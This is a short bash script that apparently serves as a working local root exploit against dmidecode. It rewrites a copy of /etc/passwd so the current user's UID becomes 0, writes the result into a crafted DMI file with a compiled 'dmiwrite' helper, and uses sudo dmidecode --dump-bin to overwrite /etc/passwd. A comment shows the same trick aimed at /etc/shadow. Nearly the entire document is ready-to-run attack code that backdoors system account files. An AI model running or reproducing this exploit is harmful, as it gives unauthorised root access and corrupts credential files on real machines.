

#!/bin/bash

# This script will compile and test the exploit.
# On the vulnerable system, execution will look something like this:
#
# sudo dmidecode -d evil.dmi --dump-bin /etc/shadow
#

set -o nounset
set -o errexit

rm "$PWD/passwd.backup"
rm "$PWD/passwd.backdoor"

#echo " " >> $PWD/passwd.backup
touch $PWD/passwd.backup
cat /etc/passwd >> $PWD/passwd.backup

who=$(whoami 2>/dev/null)
id=$(id | cut -d "(" -f 1 | sed 's/uid=//g' 2>/dev/null)

echo " " >> "$PWD/passwd.backdoor"
cat /etc/passwd | sed "s/$who:x:$id/$who:x:0/g" >> "$PWD/passwd.backdoor"

 payload_file="$PWD/passwd.backdoor"
 write_file='/etc/passwd'

# # the crafted DMI file to generate
 dmi_file='/tmp/sk.dmi'

# # this option is not present on older versions of dmidecode
 flags="--no-sysfs"

rm -f "${dmi_file}" 

#"${write_file}"

make dmiwrite

 ./dmiwrite "${payload_file}" "${dmi_file}"

sudo /usr/sbin/dmidecode "${flags}" -d "${dmi_file}" --dump-bin "${write_file}"

